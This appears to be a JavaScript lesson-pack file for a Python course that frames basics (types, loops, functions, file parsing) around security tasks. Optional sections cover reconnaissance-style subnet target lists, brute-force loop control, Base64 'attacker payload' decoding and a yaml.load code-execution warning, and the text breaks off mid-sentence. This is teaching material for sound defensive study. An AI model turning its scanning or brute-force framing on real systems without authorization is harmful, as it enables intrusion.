(typeof module !== 'undefined' && module.exports ? data => { module.exports = data; } : data => registerLessonPack('en', data))({
  "prog-01-01": {"html":"<h1>Variables and types: describe a login event</h1><p>What You Will Learn: store a login event in variables, distinguish text from numbers and booleans, and predict three lines of output. Use Python 3, or begin with the output exercise on this page. These examples use prepared data and make no network connections.</p><h2>Walk through the example</h2><p>A variable gives a value a name. \"FAILED\" is text, 3 is an integer, and a comparison produces True or False. Use = to assign and == to compare. Run these lines, then change attempts to 5 and predict which output changes.</p><div class=\"code-block\"><pre><code class=\"language-python\" data-expected=\"FAILED\n4\nFalse\">status = &quot;FAILED&quot;\nattempts = 3\nprint(status)\nprint(attempts + 1)\nprint(&quot;80&quot; == 80)</code></pre></div><p>Output / 输出</p><pre class=\"expected-output\">FAILED\n4\nFalse</pre><div class=\"callout info\"><h2>Common pitfalls</h2><p>The string \"80\" is not equal to the number 80. int(\"80\") converts that numeric text into an integer. Different types are not universally incompatible: 1 + 1.0 evaluates to 2.0. Rules depend on the operation. int(\"hello\") fails; lesson five introduces error handling.</p></div><h2>Chapter Summary</h2><p>Chapter Summary: identify the value type before choosing an operation. Next, use decisions and loops to find failed events.</p><details class=\"advanced-reading\"><summary>Further reading: the original advanced material (optional)</summary>\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Python Core</div>\n  <h2>Variables, Type Systems & Security Data Slicing</h2>\n  <p class=\"lead\">Every security script, vulnerability scanner, and exploit begins with the exact same fundamental operation: capturing untrusted external input into variables and safely parsing it within memory. Whether parsing an IP address, a network port, a hexadecimal shellcode string, or Base64-encoded credentials, memory structures demand strict type discipline. This section breaks down Python's dynamic type system, string slicing, and essential encoding pipelines.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li>Understand Python's dynamic, strong type model to prevent critical logic bugs like <code>\"80\" != 80</code>.</li>\n    <li>Master positive and negative index slicing to parse targets like <code>\"192.168.1.100:8443\"</code> effortlessly.</li>\n    <li>Conduct core security encoding conversions: ASCII, UTF-8 Bytes, Hexadecimal, and Base64.</li>\n    <li>Develop a robust, production-ready multi-format network endpoint parser.</li>\n  </ul>\n</div>\n\n<h2>1. The Mechanics of Variables & Core Security Types</h2>\n<p>In Python, variables are not static physical memory locations; they are <strong>reference pointers</strong> bound to underlying objects via <code>variable_name = object</code>:</p>\n\n<table class=\"reference-table\">\n  <thead>\n    <tr>\n      <th>Data Type</th>\n      <th>Type Name</th>\n      <th>Literal Example</th>\n      <th>Primary Security Application</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>String</strong></td>\n      <td><code>str</code></td>\n      <td><code>\"192.168.1.50\"</code></td>\n      <td>Storing hostnames, URLs, HTTP headers, and raw log lines.</td>\n    </tr>\n    <tr>\n      <td><strong>Integer</strong></td>\n      <td><code>int</code></td>\n      <td><code>443</code>, <code>65535</code></td>\n      <td>Port numbers, HTTP response status codes, brute-force retry counters.</td>\n    </tr>\n    <tr>\n      <td><strong>Boolean</strong></td>\n      <td><code>bool</code></td>\n      <td><code>True</code>, <code>False</code></td>\n      <td>Port open states, exploit success verifications, privilege checks.</td>\n    </tr>\n    <tr>\n      <td><strong>Bytes</strong></td>\n      <td><code>bytes</code></td>\n      <td><code>b\"\\x90\\x90\\xcc\"</code></td>\n      <td>Raw TCP/UDP payloads, binary shellcode buffers, cryptographic keys.</td>\n    </tr>\n  </tbody>\n</table>\n\n<div class=\"callout callout-warning\">\n  <div class=\"callout-title\">⚠️ Common Pitfall: The \"80\" vs 80 Type Trap</div>\n  <p>Text sourced from CLI parameters or HTTP headers is usually <code>str</code>. Comparing <code>if port == 80:</code> will silently evaluate to <code>False</code>. Attempting arithmetic <code>port + 1</code> triggers a fatal <code>TypeError</code>. Always enforce explicit type casting via <code>int(port)</code> wrapped in error validation before entering core business logic.</p>\n</div>\n\n<h2>2. Advanced String Slicing for Network Telemetry</h2>\n<p>Extracting telemetry substrings requires slicing syntax based on half-open intervals <code>[start:stop:step]</code> (0-indexed, excluding stop):</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Python String Slicing Demonstrations</div>\n  <pre><code class=\"language-python\">target = \"192.168.1.100:8443\"\n\n# 1. Extract host substring (indices 0 through 12)\nip_part = target[:13]       # \"192.168.1.100\"\n\n# 2. Negative indexing: isolate trailing 4-character port\nport_part = target[-4:]     # \"8443\"\n\n# 3. String reversal (useful in deobfuscating inverted shellcode strings)\nreversed_target = target[::-1]  # \"3448:001.1.861.291\"\n\n# 4. Delimiter extraction\nip, port = target.split(\":\")\nprint(f\"Host: {ip}, Port: {int(port)}\")</code></pre>\n</div>\n\n<h2>3. Security Encodings: Bytes, Hexadecimal & Base64</h2>\n<p>Security practitioners frequently inspect multi-layered binary protocols. Mastering conversions between strings, raw bytes, hex, and Base64 is essential:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Core Security Encoding Conversions in Python</div>\n  <pre><code class=\"language-python\">import base64\n\n# Scenario 1: Strings and Raw Bytes\nraw_text = \"admin:P@ssw0rd123\"\nbyte_data = raw_text.encode(\"utf-8\")     # Text to bytes: b'admin:P@ssw0rd123'\ndecoded_text = byte_data.decode(\"utf-8\")  # Bytes back to text\n\n# Scenario 2: Base64 Encoding & Decoding (HTTP Basic Auth & Staged Payloads)\nb64_encoded = base64.b64encode(byte_data).decode(\"utf-8\")\nprint(f\"Authorization: Basic {b64_encoded}\")\n\nb64_decoded = base64.b64decode(b64_encoded).decode(\"utf-8\")\nprint(f\"Decoded: {b64_decoded}\")\n\n# Scenario 3: Hexadecimal Representation & Shellcode Buffers\nhex_string = \"48656c6c6f\" # \"Hello\" in hex\nbinary_payload = bytes.fromhex(hex_string)  # Raw binary bytes: b'Hello'\nre_hex = binary_payload.hex()                # Back to hex string</code></pre>\n</div>\n\n<h2>4. Hands-On: Developing a Robust Target Parser</h2>\n<div class=\"command-block\">\n  <div class=\"command-desc\">Production-Grade Target Endpoint Normalizer</div>\n  <pre><code class=\"language-python\">def parse_target_endpoint(raw_input: str) -> dict:\n    \"\"\"Parses diverse formats ('10.0.0.1', '10.0.0.1:8080', 'https://corp:9000/api')\"\"\"\n    cleaned = raw_input.strip()\n    protocol = \"tcp\"\n    port = 80\n    \n    if \"://\" in cleaned:\n        protocol_part, cleaned = cleaned.split(\"://\", 1)\n        protocol = protocol_part.lower()\n        if protocol == \"https\":\n            port = 443\n            \n    cleaned = cleaned.split(\"/\")[0]\n    \n    if \":\" in cleaned:\n        host, port_str = cleaned.split(\":\")\n        try:\n            port = int(port_str)\n            if not (1 <= port <= 65535):\n                raise ValueError(f\"Port range invalid: {port}\")\n        except ValueError as err:\n            return {\"status\": \"ERROR\", \"msg\": str(err)}\n    else:\n        host = cleaned\n        \n    return {\n        \"status\": \"SUCCESS\",\n        \"protocol\": protocol,\n        \"host\": host,\n        \"port\": port\n    }\n\nprint(parse_target_endpoint(\"https://vuln-box.corp:8443/login.php\"))</code></pre>\n</div>\n\n<div class=\"summary-box\">\n  <div class=\"summary-title\">🎯 Chapter Summary & Key Takeaways</div>\n  <ul>\n    <li><strong>Strong Typing</strong>: Python never implicitly coerces numeric strings in arithmetic operations; external inputs must be explicitly cast via <code>int()</code>.</li>\n    <li><strong>Slicing Principles</strong>: <code>[start:stop:step]</code> operates as a left-closed, right-open interval; negative indices traverse backwards from <code>-1</code>.</li>\n    <li><strong>Encoding Triad</strong>: Utilize <code>encode/decode</code> for text streams, <code>base64.b64encode/b64decode</code> for authorization strings, and <code>bytes.fromhex/hex</code> for binary opcodes.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Payload Decoding</div>\n  <p><strong>Exercise 1:</strong> An attacker executed an encoded payload: <code>ZWNobyAiVmljdGltIENvbXByb21pc2VkIiA+IC90bXAvaGFja2VkLnR4dA==</code>. Author a three-line Python script to decode and print the plaintext UTF-8 command string.</p>\n  <p><strong>Exercise 2:</strong> Implement a function <code>is_valid_ipv4(ip_str)</code> that utilizes <code>split('.')</code> to ensure an IP contains exactly 4 octets, with each octet parsing to an integer between 0 and 255.</p>\n</div>\n</details><aside class=\"lesson-sources\"><p>References and review: 2026-11-06 · Examples use Python 3.10+.</p><a href=\"https://docs.python.org/3/tutorial/introduction.html\" target=\"_blank\" rel=\"noopener\">Python documentation</a></aside>","checkpoints":[{"question":"Which line converts a text port into an integer?","options":["int(\"443\")","\"443\" + \"1\"","str(443)","print(\"443\")"],"answer":0,"explanation":"int() converts valid numeric text; print() displays a value."},{"question":"What does print(1 + 1.0) output?","options":["TypeError","\"11.0\"","2.0","False"],"answer":2,"explanation":"This arithmetic operation accepts an integer and a float and produces a float."}],"task":{"prompt":"Exercises: set port = \"443\". Predict the output of print(int(port) + 1) and print(port == 443), preserving Python capitalization.","fields":[{"label":"Output after adding one","answer":"444"},{"label":"Comparison result","answer":"False"}],"hint":"Only the first expression converts the string."}},
  "prog-01-02": {"html":"<h1>Decisions and loops: find failed logins</h1><p>What You Will Learn: check a status with if, visit list items with for, and count failed events. Start after the variables lesson. Your goal is to explain each counter change; comprehensions and network tools can wait.</p><h2>Walk through the example</h2><p>A list stores several values inside square brackets. for assigns one value at a time to status. The indented increment runs only when the condition is True. failures += 1 means failures = failures + 1. The final print is outside the loop and runs once.</p><div class=\"code-block\"><pre><code class=\"language-python\" data-expected=\"2\">events = [&quot;FAILED&quot;, &quot;SUCCESS&quot;, &quot;FAILED&quot;]\nfailures = 0\nfor status in events:\n    if status == &quot;FAILED&quot;:\n        failures += 1\nprint(failures)</code></pre></div><p>Output / 输出</p><pre class=\"expected-output\">2</pre><div class=\"callout info\"><h2>Common pitfalls</h2><p>Indentation defines Python blocks; use four spaces per level. Moving the increment outside if counts successes too. Moving print inside the loop prints intermediate values. Trace each event on paper to spot these mistakes.</p></div><h2>Chapter Summary</h2><p>Chapter Summary: the loop visits records, the condition selects records, and the counter accumulates results. Next, put the decision in a function.</p><details class=\"advanced-reading\"><summary>Further reading: the original advanced material (optional)</summary>\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Python Logic & Flow</div>\n  <h2>Control Flow, Functions & Defensive Coding</h2>\n  <p class=\"lead\">Linear scripts operate merely as simple calculators; embedding conditional branches and iterative loops transforms raw code into resilient security scanners. This section explores conditional branching, loop safety guards, type-annotated modular functions, and defensive programming methodologies designed to withstand transient network failures.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li>Leverage <code>if / elif / else</code> structures with short-circuit evaluation for vulnerability telemetry.</li>\n    <li>Apply advanced iteration control mechanics including <code>break</code>, <code>continue</code>, and <code>for ... else</code>.</li>\n    <li>Author clean functions incorporating Python Type Hints and defensive argument unpacking.</li>\n    <li>Implement resilient <code>try / except / finally</code> exception guards to prevent unexpected scanner crashes.</li>\n  </ul>\n</div>\n\n<h2>1. Conditional Branching & Short-Circuit Optimization</h2>\n<p>Security tooling continuously classifies server responses. Python's <code>and</code> and <code>or</code> operators employ <strong>short-circuit evaluation</strong>:</p>\n<ul>\n  <li><code>A and B</code>: If <code>A</code> evaluates to <code>False</code>, Python bypasses <code>B</code> entirely. This prevents Null pointer dereferences: <code>if resp is not None and resp.status_code == 200:</code>.</li>\n  <li><code>A or B</code>: If <code>A</code> evaluates to <code>True</code>, evaluation halts immediately, returning <code>A</code>.</li>\n</ul>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">HTTP Status Code Classification Function</div>\n  <pre><code class=\"language-python\">def triage_http_status(code: int) -> str:\n    \"\"\"Triage scanner outcomes based on response status codes\"\"\"\n    if code == 200:\n        return \"SUCCESS_FOUND\"\n    elif code in (301, 302, 307, 308):\n        return \"REDIRECT_FOLLOW_UP\"\n    elif code == 403:\n        return \"FORBIDDEN_POTENTIAL_WAF\"\n    elif code == 404:\n        return \"NOT_FOUND\"\n    elif 500 <= code < 600:\n        return \"SERVER_ERROR_POTENTIAL_CRASH\"\n    else:\n        return \"UNKNOWN_TELEMETRY\"</code></pre>\n</div>\n\n<h2>2. Loop Controls & Preventing Deadlocks</h2>\n<p>Automated reconnaissance requires loops, but unbounded loops risk infinite execution:</p>\n\n<table class=\"reference-table\">\n  <thead>\n    <tr>\n      <th>Control Statement</th>\n      <th>Execution Behavior</th>\n      <th>Penetration Testing Application</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>break</code></td>\n      <td>Immediately terminates the enclosing loop</td>\n      <td>Halting brute-force iterations once valid credentials are confirmed.</td>\n    </tr>\n    <tr>\n      <td><code>continue</code></td>\n      <td>Skips remaining commands, advancing to next item</td>\n      <td>Skipping filtered hosts or closed ports immediately.</td>\n    </tr>\n    <tr>\n      <td><code>for ... else</code></td>\n      <td>Executes only if loop completes <strong>without</strong> encountering <code>break</code></td>\n      <td>Emitting 'No vulnerabilities detected' after exhausting wordlists.</td>\n    </tr>\n  </tbody>\n</table>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Resilient Retry Loop with Bounded Backoff</div>\n  <pre><code class=\"language-python\">import time\n\ndef resilient_check(target_host: str, max_retries=3) -> bool:\n    attempt = 0\n    while attempt < max_retries:\n        attempt += 1\n        try:\n            print(f\"[*] Connecting to {target_host}, attempt {attempt}...\")\n            if attempt < 3:\n                raise ConnectionResetError(\"Connection dropped by peer\")\n            print(\"[+] Connection established!\")\n            return True\n        except ConnectionResetError as e:\n            print(f\"[-] Warning: {e}. Retrying in 1s...\")\n            time.sleep(1)\n    print(f\"[!] Critical: All {max_retries} attempts failed for {target_host}\")\n    return False</code></pre>\n</div>\n\n<h2>3. Defensive Programming & Password Entropy Auditing</h2>\n<p>Defensive programming assumes all inputs are hostile and every network operation is prone to failure. Type hints and explicit error handling safeguard execution:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Password Complexity & Shannon Entropy Auditor</div>\n  <pre><code class=\"language-python\">import math\nfrom collections import Counter\n\ndef calculate_entropy(text: str) -> float:\n    \"\"\"Calculates the Shannon entropy of a string\"\"\"\n    if not text:\n        return 0.0\n    length = len(text)\n    counts = Counter(text)\n    return round(-sum((cnt / length) * math.log2(cnt / length) for cnt in counts.values()), 3)\n\ndef audit_password_strength(password: str) -> dict:\n    \"\"\"Audits password strength against length, charset diversity, and entropy\"\"\"\n    if not isinstance(password, str):\n        raise TypeError(\"Password input must be a string!\")\n        \n    issues = []\n    score = 0\n    \n    if len(password) < 8:\n        issues.append(\"Length is under 8 characters (Critical)\")\n    elif len(password) >= 14:\n        score += 40\n    else:\n        score += 20\n        \n    has_lower = any(c.islower() for c in password)\n    has_upper = any(c.isupper() for c in password)\n    has_digit = any(c.isdigit() for c in password)\n    has_special = any(not c.isalnum() for c in password)\n    \n    diversity_count = sum([has_lower, has_upper, has_digit, has_special])\n    score += diversity_count * 10\n    \n    if diversity_count < 3:\n        issues.append(\"Character categories fewer than 3 types\")\n        \n    entropy = calculate_entropy(password)\n    if entropy < 2.5:\n        issues.append(\"Low Shannon Entropy (pattern repetition)\")\n    else:\n        score += 20\n\n    return {\n        \"password_masked\": password[0] + \"***\" + password[-1] if len(password) >= 2 else \"***\",\n        \"score\": min(score, 100),\n        \"entropy\": entropy,\n        \"is_acceptable\": len(issues) == 0 and score >= 70,\n        \"recommendations\": issues\n    }\n\nprint(audit_password_strength(\"admin123\"))\nprint(audit_password_strength(\"K9#vL@82!mP$qZ\"))</code></pre>\n</div>\n\n<div class=\"summary-box\">\n  <div class=\"summary-title\">🎯 Chapter Summary & Key Takeaways</div>\n  <ul>\n    <li><strong>Short-Circuit Logic</strong>: Prevent <code>NoneType</code> errors using ordered <code>and/or</code> expressions.</li>\n    <li><strong>Flow Control</strong>: <code>break</code> terminates immediately; <code>continue</code> skips redundant processing; <code>for ... else</code> checks for exhausted lists.</li>\n    <li><strong>Defensive Validation</strong>: Explicitly validate parameter types and boundary states at function entry points.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Loop Optimization</div>\n  <p><strong>Exercise 1:</strong> When iterating over 100,000 URLs, which flow control construct terminates the search the instant an HTTP 200 is found? Outline the minimal code pattern.</p>\n  <p><strong>Exercise 2:</strong> Extend the <code>audit_password_strength</code> function to incorporate a dictionary blacklist: if the password contains <code>\"password\"</code> or <code>\"123456\"</code> (case-insensitive), immediately reset score to 0 and set <code>is_acceptable</code> to <code>False</code>.</p>\n</div>\n</details><aside class=\"lesson-sources\"><p>References and review: 2026-11-06 · Examples use Python 3.10+.</p><a href=\"https://docs.python.org/3/tutorial/controlflow.html\" target=\"_blank\" rel=\"noopener\">Python documentation</a></aside>","checkpoints":[{"question":"What happens if failures = 0 is inside the for loop?","options":["It runs faster","The counter resets on every iteration","The list is emptied","The loop never runs"],"answer":1,"explanation":"Initialize before the loop so that later iterations preserve the count."},{"question":"Where should print be placed to display only the final count?","options":["Inside if","Inside for, outside if","Before the loop","After the loop, without indentation"],"answer":3,"explanation":"Printing after the loop shows the final value rather than intermediate values."}],"task":{"prompt":"Exercises: replace events with [\"FAILED\", \"SUCCESS\", \"FAILED\", \"FAILED\"]. Predict failures, then predict it again after appending \"SUCCESS\".","fields":[{"label":"Current failures","answer":"3"},{"label":"Failures after appending a success","answer":"3"}],"hint":"A success does not satisfy status == \"FAILED\"."}},
  "prog-01-03": {"html":"<h1>Functions and return values: reuse a decision</h1><p>What You Will Learn: define a function, pass an argument, and distinguish return from print. Keep the failed-login example and extract just the decision. There is no need to learn several advanced constructs at once.</p><h2>Walk through the example</h2><p>def introduces the function name and parameter. Calling is_failed(\"FAILED\") passes that text into status. return sends the comparison result to the caller; it does not display it. The surrounding print displays that returned value.</p><div class=\"code-block\"><pre><code class=\"language-python\" data-expected=\"True\nFalse\">def is_failed(status):\n    return status == &quot;FAILED&quot;\n\nprint(is_failed(&quot;FAILED&quot;))\nprint(is_failed(&quot;SUCCESS&quot;))</code></pre></div><p>Output / 输出</p><pre class=\"expected-output\">True\nFalse</pre><div class=\"callout info\"><h2>Common pitfalls</h2><p>Think of a function as an operation with an input and a result. String comparisons are case-sensitive: \"failed\" differs from \"FAILED\". Whether to normalize with upper() should follow the input contract rather than silently changing every input.</p></div><h2>Chapter Summary</h2><p>Chapter Summary: parameters make a function reusable and return values connect processing steps. Next, split a text log into a status and a source address.</p><details class=\"advanced-reading\"><summary>Further reading: the original advanced material (optional)</summary>\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Data Structures</div>\n  <h2>Advanced Security Data Structures</h2>\n  <p class=\"lead\">Security reconnaissance frequently processes tens of thousands of subdomains, IP blocks, and open ports. Relying on inefficient nested lists causes disastrous $O(n^2)$ computational complexity. This section explores list comprehensions, resilient dictionary mapping, and Set operations providing lightning-fast $O(1)$ deduplication, intersections, and exposure drift tracking.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li>Streamline data pipelines using high-performance <strong>List Comprehensions</strong>.</li>\n    <li>Implement robust <strong>Dictionaries</strong> supporting multi-tiered nested host inventory representations.</li>\n    <li>Exploit <strong>Sets</strong> for $O(1)$ lookups, deduplication, and mathematical set relations.</li>\n    <li>Develop an automated asset exposure drift engine to alert on newly exposed ports.</li>\n  </ul>\n</div>\n\n<h2>1. List Comprehensions: Data Ingestion & Sanitization</h2>\n<p>List comprehensions execute significantly faster than manual <code>for</code> loops with <code>append</code> calls: <code>[expression for item in iterable if condition]</code>:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">High-Frequency Telemetry Data Sanitization</div>\n  <pre><code class=\"language-python\">raw_ports = [\"80\", \"443\", \"8080\", \"invalid\", \"22\", \"-1\", \"3389\", \"80\"]\n\n# 1. Filter invalid inputs and sanitize into an integer port list\nclean_ports = [int(p) for p in raw_ports if p.isdigit() and 1 <= int(p) <= 65535]\n# Output: [80, 443, 8080, 22, 3389, 80]\n\n# 2. Rapidly generate /24 subnet targets (192.168.1.1 to 192.168.1.254)\nsubnet_targets = [f\"192.168.1.{i}\" for i in range(1, 255)]\n\n# 3. Filter non-standard web ports (excluding 80 and 443)\nnon_std_web = [p for p in clean_ports if p not in (80, 443)]\n# Output: [8080, 22, 3389]</code></pre>\n</div>\n\n<h2>2. Dictionaries: Multi-Tiered Asset Modeling & Safe Access</h2>\n<p>Dictionaries represent structured asset inventories. Adhere to the following rules:</p>\n<ul>\n  <li><strong>Avoid Direct Bracket Indexing</strong>: Accessing <code>data[\"secret\"]</code> triggers an unhandled <code>KeyError</code> if missing. Use <code>data.get(\"secret\", default)</code> for optional keys with a meaningful default. For required keys, validate the input and use indexed access so a missing field is reported.</li>\n  <li><strong>Dictionary Comprehensions</strong>: Convert port lists into fast lookup tables: <code>{p: \"open\" for p in ports}</code>.</li>\n</ul>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Nested Asset Inventory Management</div>\n  <pre><code class=\"language-python\">asset_db = {\n    \"10.0.0.1\": {\n        \"hostname\": \"gateway-core\",\n        \"os\": \"Ubuntu 22.04\",\n        \"services\": {80: \"nginx/1.18\", 22: \"OpenSSH 8.9p1\"},\n        \"tags\": [\"prod\", \"edge\"]\n    },\n    \"10.0.0.5\": {\n        \"hostname\": \"db-backup\",\n        \"os\": \"Windows Server 2019\",\n        \"services\": {3389: \"MS-RDP\", 1433: \"MSSQL 2017\"},\n        \"tags\": [\"internal\", \"sensitive\"]\n    }\n}\n\nfor ip, details in asset_db.items():\n    http_banner = details.get(\"services\", {}).get(80, \"None\")\n    print(f\"Host: {ip:12} | Hostname: {details.get('hostname'):15} | Banner: {http_banner}\")</code></pre>\n</div>\n\n<h2>3. Sets: $O(1)$ Hashing & Attack Surface Drift Auditing</h2>\n<p>Sets leverage underlying hash tables to guarantee unique elements with average $O(1)$ membership checks:</p>\n\n<table class=\"reference-table\">\n  <thead>\n    <tr>\n      <th>Set Operation</th>\n      <th>Mathematical Model</th>\n      <th>Python Syntax</th>\n      <th>Cybersecurity Operational Application</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Union</strong></td>\n      <td>$A cup B$</td>\n      <td><code>a | b</code></td>\n      <td>Consolidating subdomains gathered across multiple discovery engines.</td>\n    </tr>\n    <tr>\n      <td><strong>Intersection</strong></td>\n      <td>$A cap B$</td>\n      <td><code>a & b</code></td>\n      <td>Identifying internal assets currently listed on external breach dumps.</td>\n    </tr>\n    <tr>\n      <td><strong>Difference</strong></td>\n      <td>$A - B$</td>\n      <td><code>a - b</code></td>\n      <td><strong>Subtracting yesterday's baseline from today's scan</strong> to isolate newly opened attack ports.</td>\n    </tr>\n  </tbody>\n</table>\n\n<h2>4. Hands-On: Attack Surface Drift Auditing Engine</h2>\n<div class=\"command-block\">\n  <div class=\"command-desc\">Automated Port Exposure Drift Detector</div>\n  <pre><code class=\"language-python\">def audit_exposure_diff(yesterday_scan: dict, today_scan: dict) -> dict:\n    \"\"\"Calculates asset delta: {IP: [open_ports]}\"\"\"\n    all_hosts = set(yesterday_scan.keys()) | set(today_scan.keys())\n    report = {}\n\n    for host in all_hosts:\n        y_ports = set(yesterday_scan.get(host, []))\n        t_ports = set(today_scan.get(host, []))\n\n        new_ports = t_ports - y_ports      # Newly exposed (High Risk)\n        closed_ports = y_ports - t_ports   # Decommissioned\n\n        if new_ports or closed_ports:\n            report[host] = {\n                \"NEW_EXPOSURES\": sorted(list(new_ports)),\n                \"CLOSED_SERVICES\": sorted(list(closed_ports))\n            }\n            \n    return report\n\nbaseline_day1 = {\"192.168.1.10\": [80, 443], \"192.168.1.20\": [22]}\nscan_day2 = {\n    \"192.168.1.10\": [80, 443, 8080],\n    \"192.168.1.20\": [22, 3389],\n    \"192.168.1.30\": [445]\n}\n\ndiff = audit_exposure_diff(baseline_day1, scan_day2)\nfor host, changes in diff.items():\n    if changes[\"NEW_EXPOSURES\"]:\n        print(f\"[!] Alert: Host {host} exposed new ports: {changes['NEW_EXPOSURES']}\")</code></pre>\n</div>\n\n<div class=\"summary-box\">\n  <div class=\"summary-title\">🎯 Chapter Summary & Key Takeaways</div>\n  <ul>\n    <li><strong>List Comprehensions</strong>: <code>[x for x in data if cond]</code> accelerates large-scale data ingestion and sanitization.</li>\n    <li><strong>Resilient Dictionaries</strong>: Apply <code>dict.get(key, default)</code> to safeguard scripts against abrupt termination.</li>\n    <li><strong>Set Performance</strong>: Harness $O(1)$ set differences (<code>today - yesterday</code>) to capture perimeter drift in real-time.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Set Deduplication</div>\n  <p><strong>Exercise 1:</strong> You have collected three subdomain lists from different reconnaissance tools: <code>tool_a</code> (5,000 items), <code>tool_b</code> (3,000 items), and <code>tool_c</code> (8,000 items). Write a one-line Python expression to combine them into an deduplicated collection.</p>\n  <p><strong>Exercise 2:</strong> Use a list comprehension to process <code>[\"HTTP://Example.com/A\", \"https://api.CORP.com\", \"ftp://bad\"]</code>, filtering out non-HTTP/HTTPS entries and returning only the lowercase hostnames.</p>\n</div>\n</details><aside class=\"lesson-sources\"><p>References and review: 2026-11-06 · Examples use Python 3.10+.</p><a href=\"https://docs.python.org/3/tutorial/controlflow.html#defining-functions\" target=\"_blank\" rel=\"noopener\">Python documentation</a></aside>","checkpoints":[{"question":"Does a function with return but no print automatically display its result?","options":["Always","No; the caller can use or display the result","Only on Windows","Only strings are displayed"],"answer":1,"explanation":"return passes a value; print is the display operation here."},{"question":"To check another status, should you rewrite the definition or pass another argument?","options":["Pass another argument","Rewrite the function every time","Reinstall Python","Delete return"],"answer":0,"explanation":"The function keeps the rule while arguments supply different inputs."}],"task":{"prompt":"Exercises: use the function above to predict is_failed(\"FAILED\"), is_failed(\"SUCCESS\"), and is_failed(\"failed\").","fields":[{"label":"Result for FAILED","answer":"True"},{"label":"Result for SUCCESS","answer":"False"},{"label":"Result for failed","answer":"False"}],"hint":"The function does not call upper(); case matters."}},
  "prog-02-01": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">File & Data Parsing</div>\n  <h1>File I/O, Structured Data Parsing & Log Forensics</h1>\n  <p class=\"lead\">Whether parsing millions of access log entries during incident response or digesting vulnerability templates in Nuclei and Kubernetes manifests, file operations form the bedrock of security automation. Flawed file handling risks catastrophic memory exhaustion or system handle leaks. This section covers resilient context managers, generator-based streaming ingestion, JSON/CSV parsing, and mitigating YAML code execution flaws.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li>Master the <code>with open(...)</code> context manager pattern to eliminate unclosed file descriptor leaks.</li>\n    <li>Apply generator streaming to process 10GB+ telemetry dumps while maintaining a sub-10MB RAM footprint.</li>\n    <li>Parse and serialize structured security data utilizing <code>json</code> and <code>csv.DictReader</code>.</li>\n    <li>Identify the PyYAML <code>yaml.load()</code> remote code execution vector and enforce <code>yaml.safe_load()</code>.</li>\n  </ul>\n</div>\n\n<h2>1. Context Managers & High-Throughput Log Streaming</h2>\n<p>Never rely on bare <code>f = open(...)</code> and manual <code>f.close()</code>. An unhandled exception before <code>close()</code> leaves the file descriptor open indefinitely. The <code>with</code> statement guarantees cleanup:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Safe Streaming Ingestion for Gigabyte-Scale Log Files</div>\n  <pre><code class=\"language-python\"># ❌ WRONG: f.read() or f.readlines() loads the entire file into RAM, inducing Out-Of-Memory (OOM) crashes\n# with open(\"access.log\", \"r\") as f:\n#     lines = f.readlines()\n\n# ✅ RIGHT: File objects are iterable generators; line buffers stream incrementally\nwith open(\"access.log\", \"r\", encoding=\"utf-8\", errors=\"replace\") as log_file:\n    for line_num, line in enumerate(log_file, 1):\n        if \"404\" in line:\n            # Memory footprint remains flat (< 10MB) regardless of file size\n            cleaned_line = line.strip()</code></pre>\n</div>\n\n<h2>2. Structured Parsing: JSON & CSV Telemetry</h2>\n<p>Modern SIEM alerts are encapsulated in JSON, while enterprise asset management databases export CSV records:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">JSON Deserialization and CSV DictWriter Export</div>\n  <pre><code class=\"language-python\">import json\nimport csv\n\n# 1. JSON Parsing with Error Handling\nraw_telemetry = '{\"src_ip\": \"10.0.0.8\", \"alert\": \"SQL_INJECTION\", \"severity\": 4}'\ntry:\n    event = json.loads(raw_telemetry)\n    print(f\"Alert: {event['alert']} from {event['src_ip']}\")\nexcept json.JSONDecodeError as err:\n    print(f\"Corrupted JSON payload: {err}\")\n\n# 2. Writing Structured CSV Reports\nvuln_records = [\n    {\"Host\": \"192.168.1.5\", \"Port\": 8080, \"Vulnerability\": \"Log4Shell (CVE-2021-44228)\", \"Risk\": \"Critical\"},\n    {\"Host\": \"192.168.1.12\", \"Port\": 445, \"Vulnerability\": \"EternalBlue (MS17-010)\", \"Risk\": \"High\"}\n]\n\nwith open(\"scan_report.csv\", \"w\", newline=\"\", encoding=\"utf-8\") as csvfile:\n    fieldnames = [\"Host\", \"Port\", \"Vulnerability\", \"Risk\"]\n    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)\n    writer.writeheader()\n    for row in vuln_records:\n        writer.writerow(row)</code></pre>\n</div>\n\n<h2>3. Security Pitfall: Unsafe YAML Deserialization</h2>\n<p>Many security scanners rely on YAML configs. However, Python's <code>PyYAML</code> library features a critical vulnerability pattern:</p>\n\n<div class=\"callout callout-warning\">\n  <div class=\"callout-title\">⚠️ Critical Security Trap: yaml.load Remote Code Execution</div>\n  <p>Invoking <code>yaml.load(payload, Loader=yaml.Loader)</code> enables arbitrary object reconstruction. An adversary supplying 